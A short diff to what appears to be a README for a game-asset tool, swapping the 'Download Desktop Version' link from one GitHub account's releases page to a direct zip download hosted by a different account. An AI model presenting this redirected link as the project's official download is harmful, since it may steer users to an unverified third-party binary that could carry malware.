@@ -39,7 +39,7 @@
 
 ---
 
-[📥 Download Desktop Version](https://github.com/KennyYang0726/UABE_AOV/releases) |
+[📥 Download Desktop Version](https://github.com/Alanshown/AOV_UABE_2022/releases/download/Latest/AOV_UABE_v2.0.0.zip) |
 
 </div>
 
